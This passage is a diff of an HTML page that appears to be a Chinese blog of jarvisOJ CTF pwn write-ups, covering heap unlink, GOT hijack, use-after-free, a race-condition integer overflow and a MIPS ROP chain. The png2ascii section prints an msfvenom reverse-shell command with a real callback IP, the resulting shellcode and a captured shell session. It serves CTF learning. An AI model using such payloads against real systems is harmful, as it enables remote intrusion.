-<p>而 flag 就在 bin_by_hex 上方，这样如果我们构造 <code>value1 = 0, value2 = flag[i]</code>，就可以覆盖 flag[i] 了，这样就可以通过逐位覆盖 flag，根据不同的回显来爆破了。</p>
-
+</div><p>而 flag 就在 bin_by_hex 上方，这样如果我们构造 <code>value1 = 0, value2 = flag[i]</code>，就可以覆盖 flag[i] 了，这样就可以通过逐位覆盖 flag，根据不同的回显来爆破了。</p>
 <p>王一航师傅对这道题目做过很详细的分析，<a href="https://www.jianshu.com/p/40f846d14450">传送门</a></p>
-
 <h2 id="http-350">HTTP (350)</h2>
-
 <p>这道题目也更像一个逆向，没有 pwn 常见的溢出等漏洞，而是直接可以命令执行</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1603,13 +1529,13 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
   <span class="p">}</span>
   <span class="n">a2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
   <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">i</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>当然到这一步需要通过前边的各种验证</p>
+</div><p>当然到这一步需要通过前边的各种验证</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1640,25 +1566,19 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
       <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="k">return</span> <span class="mi">1LL</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>encrypt 函数逆到一半发现都是固定值，直接可以把结果调试出来。按照题目的要求构造报文格式，就可以任意命令执行了。</p>
-
+</div><p>encrypt 函数逆到一半发现都是固定值，直接可以把结果调试出来。按照题目的要求构造报文格式，就可以任意命令执行了。</p>
 <p>但关键是执行什么命令，这道题目是通过 socket 进行通信的，因此直接 <code>cat flag</code> 不会有回显，可以通过管道将结果发送到远程 vps 上，在 vps 上监听到 flag，或者可以直接建立一个 reverse shell。</p>
-
 <p>原理可以看我写的几篇分析 <a href="http://m4x.fun/post/play-with-file-descriptor-1/">fd</a> 的文章。</p>
-
 <p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_HTTP/solve.py">expoit here</a></p>
-
 <h2 id="guestbook2-400">Guestbook2 (400)</h2>
-
 <p>Guessbook2，[XMAN]level6，[XMAN]level6_x64 三道题目几乎一样，放到一块讲。</p>
-
 <p>程序中存在如下的结构体</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1685,13 +1605,13 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
 	<span class="kt">int</span> <span class="n">inuse</span><span class="p">;</span>
 	<span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
 	<span class="kt">char</span> <span class="o">*</span><span class="n">content</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>在 delete 函数中存在漏洞</p>
+</div><p>在 delete 函数中存在漏洞</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1744,37 +1664,28 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
       <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Invalid number!&#34;</span><span class="p">);</span>
     <span class="p">}</span>
   <span class="p">}</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>在 add 和 edit 函数中，新申请的堆块是经过 0x80 对其的，即只能申请 0x80，0x100,0x180 &hellip; 这样的堆块。</p>
-
+</div><p>在 add 和 edit 函数中，新申请的堆块是经过 0x80 对其的，即只能申请 0x80，0x100,0x180 &hellip; 这样的堆块。</p>
 <p>可以有如下的思路：</p>
-
 <ol>
 <li>先 leak 堆的地址</li>
 <li>根据 leak 出的堆的地址进行 unlink</li>
 <li>unlink 后把 chunk_list 中的某一项改成 got（如atoi@got)，这样 show 就可以 leak libc，edit 就可以 hijack got</li>
 <li>把 atoi@got 改成 system，然后发送 <code>$0\0</code>，<code>sh\0</code> 或 <code>/bin/sh\0</code> 即可 get shell</li>
 </ol>
-
 <p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_Guestbook2/exp.py">exploit here</a></p>
-
-<h2 id="xman-level6-350">[XMAN]level6 (350)</h2>
-
+<h2 id="xmanlevel6-350">[XMAN]level6 (350)</h2>
 <p>同上，只不过是 32 位的</p>
-
-<h2 id="xman-level6-x64-400">[XMAN]level6_x64 (400)</h2>
-
+<h2 id="xmanlevel6_x64-400">[XMAN]level6_x64 (400)</h2>
 <p>同上</p>
-
-<h2 id="61dctf-hsys-400">[61dctf]hsys (400)</h2>
-
+<h2 id="61dctfhsys-400">[61dctf]hsys (400)</h2>
 <p>这个程序也很大，要耐心看。
 程序中存在如下的结构体</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1791,13 +1702,13 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
 	<span class="kt">char</span> <span class="o">*</span><span class="n">something</span><span class="p">;</span>
 	<span class="kt">int</span> <span class="n">gender</span><span class="p">;</span>
 	<span class="kt">int</span> <span class="n">age</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>程序给了 <code>list</code>, <code>add</code>, <code>show</code>, <code>info</code>, <code>gender</code> 和 <code>exit</code> 几个功能，通过看代码发现还有一个 <code>del</code> 的隐藏功能，只有 id 为 0 ，即为 admin 的时候才能触发。</p>
+</div><p>程序给了 <code>list</code>, <code>add</code>, <code>show</code>, <code>info</code>, <code>gender</code> 和 <code>exit</code> 几个功能，通过看代码发现还有一个 <code>del</code> 的隐藏功能，只有 id 为 0 ，即为 admin 的时候才能触发。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1850,13 +1761,13 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
         <span class="p">{</span>
           <span class="n">v25</span> <span class="o">=</span> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;usage: del &lt;hacker name&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
         <span class="p">}</span>
-      <span class="p">}</span></code></pre></td></tr></table>
+      <span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>再看 add 的功能，算法渣表示楞了很久才反应过来到这是一个 hash 表 orz。</p>
+</div><p>再看 add 的功能，算法渣表示楞了很久才反应过来到这是一个 hash 表 orz。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1915,30 +1826,29 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
   <span class="n">v1</span><span class="o">-&gt;</span><span class="n">something</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
   <span class="n">ptr</span><span class="p">[</span><span class="n">v3</span><span class="p">]</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>
   <span class="k">return</span> <span class="n">v3</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>其中 memcpy 不会在末尾加上 <code>\0</code>，因此是可以 leak 的，可以利用这个来 leak libc</p>
-
+</div><p>其中 memcpy 不会在末尾加上 <code>\0</code>，因此是可以 leak 的，可以利用这个来 leak libc</p>
 <blockquote>
 <p>打个小广告，找 main_arena 在 libc 中的偏移可以用我写的这个 <a href="https://github.com/bash-c/main_arena_offset#install">小工具</a></p>
+</blockquote>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">jarvisOJ_hsys <span class="o">[</span>master●●<span class="o">]</span> main_arena ./libc-2.19.so 
 <span class="o">[</span>+<span class="o">]</span>__malloc_hook_offset : 0x1ab408
-<span class="o">[</span>+<span class="o">]</span>main_arena_offset : 0x1ab420</code></pre></td></tr></table>
+<span class="o">[</span>+<span class="o">]</span>main_arena_offset : 0x1ab420
+</code></pre></td></tr></table>
 </div>
-</div></blockquote>
-
-<p>继续看其他函数，发现在 <code>show</code> 中有一个 很可疑的<code>memcpy</code>，有可能造成栈溢出</p>
+</div><p>继续看其他函数，发现在 <code>show</code> 中有一个 很可疑的<code>memcpy</code>，有可能造成栈溢出</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2085,44 +1995,37 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
       <span class="p">{</span>
         <span class="n">v44</span> <span class="o">=</span> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;You must add a hacker first and then show information about him/her</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
       <span class="p">}</span>
-    <span class="p">}</span>   </code></pre></td></tr></table>
+    <span class="p">}</span>   
+</code></pre></td></tr></table>
 </div>
-</div>
-<ul>
+</div><ul>
 <li>为什么会觉得 memcpy 可疑？
-
 <ul>
 <li>像之前说的，这种代码多的题目一般不会有很难找的漏洞，因此我着重看了 strcpy，memcpy 等危险函数，发现 memcpy 的长度在一定条件下是可以控制的</li>
-</ul></li>
 </ul>
-
+</li>
+</ul>
 <p>这样如果能控制 <code>memcpy</code> 的长度，就可以直接栈溢出来 rop 或者用 one_gadget 了。</p>
-
 <p>至于怎么控制长度，我是完全参考了师傅的 writeup，直接给出 <a href="https://veritas501.space/2017/03/10/JarvisOJ_WP/">vertitas501</a> 师傅的链接，就不在这里鹦鹉学舌了。</p>
-
 <blockquote>
 <p>后来复习了一下哈希表的知识发现这个题目还是很好解决的，这种东西果然不用就会忘得一干二净= =</p>
 </blockquote>
-
-<h2 id="61dctf-hiphop-400">[61dctf]hiphop (400)</h2>
-
+<h2 id="61dctfhiphop-400">[61dctf]hiphop (400)</h2>
 <p>这个题目代码有点多，看了一遍下来是一个打怪兽的程序。逻辑如下：</p>
-
 <ol>
 <li>用户选择技能(change skill)，如果不选择默认为 attack</li>
 <li>使用技能，分两步进行：
-
 <ol>
 <li>怪兽攻击，用户选择三种防御策略(iceshield, fireshield, windshield)，怪兽的攻击方式随机，如果用户使用了对应的防御策略则成功防御，不扣 hp，否则扣除用户相应 hp</li>
 <li>用户攻击，每种技能的伤害不同</li>
-</ol></li>
+</ol>
+</li>
 <li>用户每胜利一次怪兽都会升级一次，不同等级的怪兽有不同的初始 hp(64h, 3E8h, 0BB8h, 7FFFFFFFFFFFFFFEh)；当怪兽升级 3 次以上，用户胜利后即可 get flag</li>
 </ol>
-
 <p>先看一下有没有什么比较特殊的技能，发现 <code>fireball</code> 和 <code>icesword</code> 两个技能会 sleep(1)，再联想到主函数是新开了一个进程处理逻辑的，想到了条件竞争；再仔细看，<code>icesword</code> 的伤害还是负的。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2171,28 +2074,23 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
   <span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="n">rand</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x8FFFFFFF</span> <span class="o">|</span> <span class="n">v1</span><span class="p">;</span>
   <span class="n">v3</span> <span class="o">=</span> <span class="n">v2</span> <span class="o">|</span> <span class="p">((</span><span class="kt">signed</span> <span class="kr">__int64</span><span class="p">)</span><span class="n">rand</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFF00000000LL</span><span class="p">;</span>
   <span class="o">*</span><span class="n">a1</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>主函数中可以看出程序使用了 <code>time(0)</code> 当做随机数种子，也就是说随机数是可以预测的；再仔细观察，第四关时，怪兽的初始 hp 为 0x7FFFFFFFFFFFFFFE，只要 +2 就会造成整数溢出，满足判断胜负时怪兽 hp &lt; 0 的判断。那么就有了以下的思路：</p>
-
+</div><p>主函数中可以看出程序使用了 <code>time(0)</code> 当做随机数种子，也就是说随机数是可以预测的；再仔细观察，第四关时，怪兽的初始 hp 为 0x7FFFFFFFFFFFFFFE，只要 +2 就会造成整数溢出，满足判断胜负时怪兽 hp &lt; 0 的判断。那么就有了以下的思路：</p>
 <ol>
 <li>先利用能预测随机数的特点完美防御怪兽的攻击，直到第四关。</li>
 <li>选择 <code>fireball</code>，然后 use skill，此时子进程会在设置伤害时 sleep(1)，但主进程还在继续运行，主进程继续 change skill 到 <code>icesword</code>，然后 use skill；这样既可以通过技能伤害不为负的验证，在攻击时又会取 <code>icesword</code> 的伤害导致怪兽的 hp + 1，连续两次造成整数溢出就可以跳到后门函数拿到 flag 了。</li>
 </ol>
-
 <blockquote>
 <p>本地能稳定跳转到后门函数后，发现远程一直失败。用另一道题目的 shell 查看时间才发现虽然都是 UTC 时间，但相差了大概 25s，修改本地时间后终于拿到了 flag（UTC 时间不同步我还特意问了汪师傅，师傅告诉我确实需要预测时间差）</p>
 </blockquote>
-
 <p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_hiphop/solve.py">exploit here</a></p>
-
 <h2 id="item-board-450">Item Board (450)</h2>
-
 <p>这个题目存在如下的结构体</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2205,13 +2103,13 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
   <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">description</span><span class="p">;</span>
   <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">free</span><span class="p">)(</span><span class="n">ItemStruct</span> <span class="o">*</span><span class="p">);</span>
-<span class="p">};</span></code></pre></td></tr></table>
+<span class="p">};</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>释放结构体后没有把指针清零，存在并且 show 时只检查了下标</p>
+</div><p>释放结构体后没有把指针清零，存在并且 show 时只检查了下标</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2270,35 +2168,31 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
   <span class="p">{</span>
     <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Hacker!&#34;</span><span class="p">);</span>
   <span class="p">}</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>因此可以先通过 unsorted bin 来 leak libc</p>
+</div><p>因此可以先通过 unsorted bin 来 leak libc</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">jarvisOJ_ItemBoard <span class="o">[</span>master●<span class="o">]</span> main_arena ./libc-2.19.so
 <span class="o">[</span>+<span class="o">]</span>__malloc_hook_offset : 0x3be740
-<span class="o">[</span>+<span class="o">]</span>main_arena_offset : 0x3be760</code></pre></td></tr></table>
+<span class="o">[</span>+<span class="o">]</span>main_arena_offset : 0x3be760
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>然后通过 uaf 控制结构体里的函数指针，改成 system，那么在下一次 free 时，就相当于调用了 system(chunk)，只需要把 chunk 首部改成 <code>$0; sh; /bin/sh;</code> 等即可。</p>
-
+</div><p>然后通过 uaf 控制结构体里的函数指针，改成 system，那么在下一次 free 时，就相当于调用了 system(chunk)，只需要把 chunk 首部改成 <code>$0; sh; /bin/sh;</code> 等即可。</p>
 <p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_ItemBoard/solve.py">exploit here</a></p>
-
 <h2 id="png2ascii-450">png2ascii (450)</h2>
-
 <p>这是 defconCTF 20 Quals 的一道题目，mips 架构。
 程序是静态编译的，可以先用 rizzo 和 sig 恢复部分符号。通过搜索字符串可以定位到关键函数是从 0x401200 开始的。</p>
-
 <p>测试后发现在 <code>png2ascii</code> 功能里存在栈溢出，漏洞发生在 read_n_until 时</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2321,13 +2215,13 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
 <span class="nl">.text:</span><span class="err">00401</span><span class="nf">C68</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; read_n_until  # call read_n_until
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00401</span><span class="no">C68</span>                                          <span class="c">#
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00401</span><span class="no">C68</span>                                          <span class="c">#
-</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00401</span><span class="no">C68</span>                                          <span class="err">#</span> <span class="no">stack</span> <span class="no">overflow</span> <span class="no">bug</span></code></pre></td></tr></table>
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00401</span><span class="no">C68</span>                                          <span class="c"># stack overflow bug
+</span></code></pre></td></tr></table>
 </div>
-</div>
-<p>可以输入 0x200 个字符，缓冲区却只有 0x108，如果是 x86 直接 rop 即可，但 mips 架构找不到太好的 gadget，最后参考了别人的 writeup 找了这么一段</p>
+</div><p>可以输入 0x200 个字符，缓冲区却只有 0x108，如果是 x86 直接 rop 即可，但 mips 架构找不到太好的 gadget，最后参考了别人的 writeup 找了这么一段</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2354,13 +2248,13 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
 <span class="nl">.text:</span><span class="err">0040</span><span class="nf">F98C</span>                 <span class="no">lw</span>      <span class="no">$a0</span><span class="p">,</span> <span class="mi">0x30</span><span class="err">+</span><span class="no">var_4</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>
 <span class="nl">.text:</span><span class="err">0040</span><span class="nf">F990</span>                 <span class="no">la</span>      <span class="no">$t9</span><span class="p">,</span> <span class="no">sub_4115FC</span>
 <span class="nl">.text:</span><span class="err">0040</span><span class="nf">F994</span>                 <span class="no">nop</span>
-<span class="nl">.text:</span><span class="err">0040</span><span class="nf">F998</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="err">;</span> <span class="no">sub_4115FC</span></code></pre></td></tr></table>
+<span class="nl">.text:</span><span class="err">0040</span><span class="nf">F998</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; sub_4115FC
+</span></code></pre></td></tr></table>
 </div>
-</div>
-<p>这样有栈上的变量，看的不是很清楚，我们可以直接在调试的过程中查看这段 gadget</p>
+</div><p>这样有栈上的变量，看的不是很清楚，我们可以直接在调试的过程中查看这段 gadget</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2374,6 +2268,7 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
 </span><span class="lnt">12
 </span><span class="lnt">13
 </span><span class="lnt">14
+</span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">pdisass</span> <span class="mi">0x40f968</span> <span class="mi">10</span>
@@ -2389,15 +2284,15 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
    <span class="err">0</span><span class="nf">x40f98c</span>    <span class="no">lw</span>     <span class="no">$a0</span><span class="p">,</span> <span class="mi">0x2c</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>
    <span class="err">0</span><span class="nf">x40f990</span>    <span class="no">lw</span>     <span class="no">$t9</span><span class="p">,</span> <span class="p">-</span><span class="mi">0x7ccc</span><span class="p">(</span><span class="no">$gp</span><span class="p">)</span>
    <span class="err">0</span><span class="nf">x40f994</span>    <span class="no">nop</span>    
-   <span class="mi">0x40f998</span>    <span class="no">jalr</span>   <span class="no">$t9</span></code></pre></td></tr></table>
-</div>
-</div>
-<p>这样就看的很清楚了，可以控制 read 的三个参数和后边的任意跳转（佩服大佬找 gadget 的深厚功力，如果师傅们有什么好的找 gadget 的方法，请务必指教）</p>
+   <span class="mi">0x40f998</span>    <span class="no">jalr</span>   <span class="no">$t9</span>
 
+</code></pre></td></tr></table>
+</div>
+</div><p>这样就看的很清楚了，可以控制 read 的三个参数和后边的任意跳转（佩服大佬找 gadget 的深厚功力，如果师傅们有什么好的找 gadget 的方法，请务必指教）</p>
 <p>可以构造如下的 rop chain</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2416,9 +2311,9 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
 </span><span class="lnt">17
 </span><span class="lnt">18
 </span><span class="lnt">19
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">+----------+
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">+----------+
 |0x0040F968|  &lt;- ret addr
 +----------+
 |0x4       |  &lt;- socket file descriptor ----+
@@ -2436,11 +2331,10 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
 |junk data |
 +----------+
 |0x10007ccc|  &lt;- set $gp
-+----------+</pre></td></tr></table>
++----------+
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>此时的 rop 流程如下</p>
-
+</div><p>此时的 rop 流程如下</p>
 <ol>
 <li>返回到 0x40F968，即上边的 gadget 地址</li>
 <li><code>lw $gp, 0x20($sp)</code> -&gt; gp = sp + 0x20 = 0x10007ccc</li>
@@ -2451,11 +2345,10 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
 <li><code>lw $t9, -0x7ccc($gp)</code> -&gt; t9 = 0x100000000</li>
 <li><code>jalr $t9</code> -&gt; 跳转到 0x10000000</li>
 </ol>
-
 <p>因此，我们只需要把一段 reverse shell 的 shellcode 读到 0x10000000 即可，我用 msf 生成了一段</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2480,7 +2373,7 @@ pwndbg&gt; x/20i 0x7ffff781a000+0x44f05
 </span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">root@58a35925ee88:/# msfvenom -a mipsle -p linux/mipsle/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">123</span>.207.141.87 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4445</span> -f python
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@58a35925ee88:/# msfvenom -a mipsle -p linux/mipsle/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>123.207.141.87 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4445</span> -f python
 <span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 No encoder or badchars specified, outputting raw payload
 Payload size: <span class="m">184</span> bytes
@@ -2502,13 +2395,13 @@ Final size of python file: <span class="m">896</span> bytes
 <span class="nv">buf</span> <span class="o">+=</span> <span class="s2">&#34;\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01&#34;</span>
 <span class="nv">buf</span> <span class="o">+=</span> <span class="s2">&#34;\x01\x01&#34;</span>
 
-<span class="c1"># 腾讯云的学生主机没什么东西，大佬们就不要搞了</span></code></pre></td></tr></table>
+<span class="c1"># 腾讯云的学生主机没什么东西，大佬们就不要搞了</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>然后就可以在 vps 上拿到 shell 了</p>
+</div><p>然后就可以在 vps 上拿到 shell 了</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2521,27 +2414,24 @@ Final size of python file: <span class="m">896</span> bytes
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">ubuntu@VM-61-71-ubuntu:~$ nc -lvp <span class="m">4445</span>
-Listening on <span class="o">[</span><span class="m">0</span>.0.0.0<span class="o">]</span> <span class="o">(</span>family <span class="m">0</span>, port <span class="m">4445</span><span class="o">)</span>
-Connection from <span class="o">[</span><span class="m">209</span>.222.100.138<span class="o">]</span> port <span class="m">4445</span> <span class="o">[</span>tcp/*<span class="o">]</span> accepted <span class="o">(</span>family <span class="m">2</span>, sport <span class="m">39056</span><span class="o">)</span>
+Listening on <span class="o">[</span>0.0.0.0<span class="o">]</span> <span class="o">(</span>family 0, port 4445<span class="o">)</span>
+Connection from <span class="o">[</span>209.222.100.138<span class="o">]</span> port <span class="m">4445</span> <span class="o">[</span>tcp/*<span class="o">]</span> accepted <span class="o">(</span>family 2, sport 39056<span class="o">)</span>
 ls
 flag
 pwn100
 supervisord.log
 supervisord.pid
 id
-<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>ctf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>ctf<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>ctf<span class="o">)</span></code></pre></td></tr></table>
